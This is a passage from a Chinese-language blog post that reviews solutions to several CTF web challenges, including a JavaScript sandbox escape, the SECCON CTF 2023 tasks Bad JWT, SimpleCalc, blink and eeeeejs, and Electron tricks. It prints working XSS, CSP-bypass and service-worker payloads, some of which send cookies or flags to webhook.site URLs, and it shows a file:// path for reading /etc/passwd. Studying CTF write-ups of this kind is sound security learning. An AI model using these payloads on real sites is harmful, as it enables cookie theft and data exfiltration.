punctuation">.</span>prototype<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">console.log(1)</span><span class="token template-punctuation string">`</span></span><span class="token keyword">const</span> argNames <span class="token operator">=</span> <span class="token function">allKeys</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">)</span><span class="token keyword">const</span> fn <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token operator">...</span>argNames<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">callUserFn</span> <span class="token operator">=</span> <span class="token parameter">t</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'User function error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token comment">// hardening</span><span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">callUserFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>argNames 是搜集所有 global 能存取到的東西的名稱，這樣就可以把所有東西的名稱都當作是函式的參數丟進去，大概就像是底下這種感覺：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token parameter">console<span class="token punctuation">,</span> Object<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> fetch<span class="token punctuation">,</span><span class="token operator">...</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>於是你不管拿到什麼都會是 <code>undefined</code>，在呼叫時 this 也傳入了 <code>Object.create(null)</code>，所以沒辦法輕易跳出來。</p><p>Maple 的預期解是利用 try catch 加上錯誤去拿：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  TypeError <span class="token operator">=</span> e<span class="token punctuation">.</span>constructor<span class="token punctuation">&#125;</span>Error <span class="token operator">=</span> <span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructorError<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> structuredStackTrace</span><span class="token punctuation">)</span> <span class="token operator">=></span> structuredStackTrace<span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> g <span class="token operator">=</span> e<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>target  <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> g <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這招他之前在 DiceCTF 2022 - undefined 這題也用過類似的。</p><p>不過對於這題來說有個更容易的解法，利用 this 預設的特性，如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 JavaScript 裡面，呼叫一個 function 時預設的 this 就會是 global，用這樣就可以繞過限制。</p><p>但繞過限制之後要幹嘛呢？在 worker 裡面拿到 XSS 之後好像做不了什麼事情，因為 main thread 的 <code>setHTML</code> 會做過濾，而且這題的 CSP 是 <code>default-src &#39;self&#39; &#39;unsafe-eval&#39;</code></p><p>關鍵就在於 blob URL，可以用 blob 新建一個 HTML 並且載入，這個新 HTML 的 origin 跟原本的是一樣的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> u <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">this<span class="token punctuation">.</span>Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>peko&lt;/h1>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>location <span class="token operator">=</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而這題讓我驚訝的地方是原來 <code>&lt;meta&gt;</code> 的跳轉也可以跳到 blob URL 去，所以結合 meta redirect 之後就可以把 top level page 變成是自己的 HTML，繞過 sanitizer 的限制。</p><p>但此時 CSP 會繼承，所以還是要繞過 CSP，這邊可以再次利用 worker.js，把 worker.js 當作是一般的 script 載入，就能夠在 main thread 底下執行 XSS 了。</p><p>這題真的很有趣，blob 的運用方式也很巧妙。</p><h3><span id="amf-4-solves">AMF (4 solves)</span></h3><p>有點懶得研究 python 的東西，就先放著吧，作者有寫 writeup。</p><h3><span id="harmony-2-solves">Harmony (2 solves)</span></h3><p>這題各種 Electron 黑魔法。</p><p>在 Chromium 中 <code>.localhost</code> 結尾的 domain 在利用 file protocol 時會被忽略，例如說：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; failfile:&#x2F;&#x2F;www.youtube.com.attacker.com&#x2F;etc&#x2F;passwd&#x2F;&#x2F; successfile:&#x2F;&#x2F;www.youtube.com.localhost&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（我怎麼覺得以前我好像有無意間翻到過這一段的 code）</p><p>而 file:&#x2F;&#x2F; 會被 DOMPurify 濾掉，不過因為網頁本來就是 file，所以可以改成用 <code>//</code> 來繞過檢查。</p><p>接著，<code>file://</code> 在 Electorn 裡面都是 same-origin，所以載入自己的檔案以後就可以存取到 top.api</p><p>最後再結合一些 prototype pollution 的東西，就可以拿到 RCE（後半段我沒有仔細研究，可參考作者的 writeup）</p><h3><span id="sharers-world-1-solve">Sharer’s World (1 solve)</span></h3><p>這題的關鍵是一個叫做 SXG 的東西：<a href="https://web.dev/signed-exchanges/">https://web.dev/signed-exchanges/</a></p><p>在這場比賽以前我完全沒聽過這個，而且 web.dev 上的參考資料居然 2021 就有了，看來我真的是 lag 太久了。</p><p>簡單來講呢，SXG 就是可以拿憑證對一個網頁做簽章，如此一來其他網站在發送這個簽過章的資源時，瀏覽器就可以把這個資源視為是有憑證的那個網站。</p><p>舉個例子，今天 example.com 的人拿著他們的私鑰對一個網站簽名，產生了一個 example.sxg 檔案，接著我拿到了這個檔案，放到我的主機上，網址是：<a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a></p><p>當使用者造訪 <a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a> 時，內容會是之前的網站，而網址會變成 example.com，就好像這個網頁是直接從 example.com 出來的一樣。</p><h2><span id="seccon-ctf-2023">SECCON CTF 2023</span></h2><p>身為一個 JavaScript 愛好者，這次的 SECCON CTF 的題目我很喜歡，充滿了一堆的 JavaScript。雖然說有些題目沒解出來，但依舊學到很多。</p><h3><span id="bad-jwt-107-solves">Bad JWT (107 solves)</span></h3><p>這題的目標是要產出一個 <code>isAdmin: true</code> 的 JWT，而重點在於驗證 JWT 的邏輯：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> algorithms <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">hs256</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">hs512</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha512'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">createSignature</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token keyword">const</span> signature <span class="token operator">=</span> algorithms<span class="token punctuation">[</span>header<span class="token punctuation">.</span>alg<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> signature<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 <code>header.alg</code> 是 <code>constructor</code>，就會變成 <code>const signature = Object(data,secret)</code>，產出的結果會變成一個 string 的物件，而且裡面只含有 data，忽略了 secret：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Object</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// String &#123;'data'&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此只要根據這個構造一個相同的 signature 就好。</p><p>更詳細的 writeup 可以參考：<a href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p><h3><span id="simplecalc-23-solves">SimpleCalc (23 solves)</span></h3><p>這題可以讓你執行任意 JavaScript，但是必須使用 fetch 加上 X-FLAG 這個 header 才能拿到 flag，可是會被 CSP 擋住：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> js_url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/js/index.js</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">default-src </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>js_url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> 'unsafe-eval';</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要製造出一個 header too large 的 response 並用 iframe 嵌入，就能得到一個沒有 CSP 的 same-origin 頁面，繞過 CSP：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000/js/index.js?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">20000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        f<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'X-FLAG'</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">credentials</span><span class="token operator">:</span><span class="token string">'include'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=></span> location<span class="token operator">=</span><span class="token string">'https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='</span><span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有趣的是如果用 <code>window.open</code> 就不行，看賽後討論是有人說因為 window.open 會把錯誤頁面導到一個 <code>chrome://error</code> 之類的地方，所以 origin 會變成 null。</p><p>而這題的預期解其實是 service worker，在 http + localhost 底下是可以用 sw 的，靠著 service worker 把 CSP header 拿掉。</p><p>底下是 @DimasMaulana 的 exploit：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotetarget <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>webhook <span class="token operator">=</span> <span class="token string">"https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10"</span>rmcsp <span class="token operator">=</span> <span class="token triple-quoted-string string">"""self.addEventListener("fetch", (ev) => &#123;    console.log(ev)    let headers = new Headers()    headers.set("Content-Type","text/html")    if (/\/js\//.test(ev.request.url))&#123;        ev.respondWith(new Response("&lt;script>fetch('/flag',&#123;headers:&#123;'X-FLAG':'1'&#125;,credentials:'include'&#125;).then(async r=>&#123;location='"""</span><span class="token operator">+</span>webhook<span class="token operator">+</span><span class="token triple-quoted-string string">"""?'+await r.text()&#125;)&lt;/script>",&#123;headers&#125;))    &#125;&#125;);console.log("registered2")document = &#123;&#125;document.getElementById = ()=>&#123;return &#123;innerText:"testing"&#125;&#125;"""</span>workerUrl <span class="token operator">=</span> <span class="token string">"/js/index.js?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>rmcsp<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"navigator.serviceWorker.register('"</span><span class="token operator">+</span>workerUrl<span class="token operator">+</span><span class="token string">"');setInterval(()=>&#123;location='/js/test'&#125;,2000)"</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> target<span class="token operator">+</span><span class="token string">"/js/..%2f?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="blink-14-solves">blink (14 solves)</span></h3><p>這題的核心程式碼如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">createBlink</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">html</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#viewer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// I believe it is impossible to escape this iframe sandbox...</span>  sandbox<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> sandboxAttribute<span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"100%"</span><span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> html<span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>onload <span class="token operator">=</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>contentDocument<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  target<span class="token punctuation">.</span>popover <span class="token operator">=</span> <span class="token string">"manual"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>togglePopover<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">clearInterval</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    sandbox<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>iframe 的地方沒辦法 bypass sandbox，但重點是 <code>setInterval(target.togglePopover, 400)</code> 這一行程式碼。</p><p>如果 <code>target.togglePopover</code> 是字串的話，就可以拿來當成 eval 用。</p><p>而 <code>target</code> 是 <code>sandbox.contentDocument.body</code>，可以用 <code>name</code> 去 DOM clobber <code>document.body</code>，接著再去 clobber <code>togglePopover</code> 就搞定了。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>body</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=$&#123;document.cookie&#125;`)>&lt;/a><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="eeeeejs-12-solves">eeeeejs (12 solves)</span></h3><p>遺憾的一題，試了很久但沒有解開 QQ</p><p>這題的核心程式碼如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"ejs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename<span class="token punctuation">,</span> <span class="token operator">...</span>query <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>你可以控制 <code>filename</code> 跟 <code>query</code>，目標是 XSS。</p><p>而 CSP 是 self，意思就是只要做出 <code>&lt;script src=/&gt;</code> 跟建構出一個合法的 JS 程式碼就可以拿到 flag 了。</p><p>但這邊另一個限制是只能讀取 <code>src</code> 底下的檔案，所以你的 template 是有限的。</p><p>而解法是利用 EJS 的 options <code>openDelimiter</code>、<code>closeDelimiter</code> 以及 <code>delimiter</code>，讓 EJS 用不同的方式去解析模板。</p><p>因為在 EJS 裏面 <code>&lt;%=</code> 可以輸出後面接的內容，而 <code>&lt;%-</code> 則是可以輸出 unescaped 的內容，所以我一開始的想法是找到符合這種 pattern 的字串，到最後只找到了一半，可以做出 <code>&lt;script&gt;</code> 但是屬性內容會被編碼，也找到了合法的 JavaScript 產生方式，總之最後沒做出來。</p><p>賽後看了一下其他人的解法，才意識到我忘記了這題是呼叫 node.js 以後輸出，作者的解法是把 debug 設成 true，就可以讓 EJS 輸出 src，而 src 會包含 filename，再利用 filename 可以是一個 object 的特性來傳入任意內容。</p><p>或是也可以直接把 <code>console.log(src)</code> 放到 template 裡面去。</p><p>舉例來說，有一段文字如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>debug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug <span class="token operator">&amp;&amp;</span> opts<span class="token punctuation">.</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>當我們這樣做以後：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token string-property property">'src'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">helllo</span><span class="token operator">:</span> <span class="token string">'world'</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">delimiter</span><span class="token operator">:</span> <span class="token string">' '</span><span class="token punctuation">,</span>      <span class="token literal-property property">openDelimiter</span><span class="token operator">:</span> <span class="token string">'if (opts.debug)'</span><span class="token punctuation">,</span>      <span class="token literal-property property">closeDelimiter</span><span class="token operator">:</span> <span class="token string">" if (opts.compileDebug &amp;&amp; opts.filename)"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span 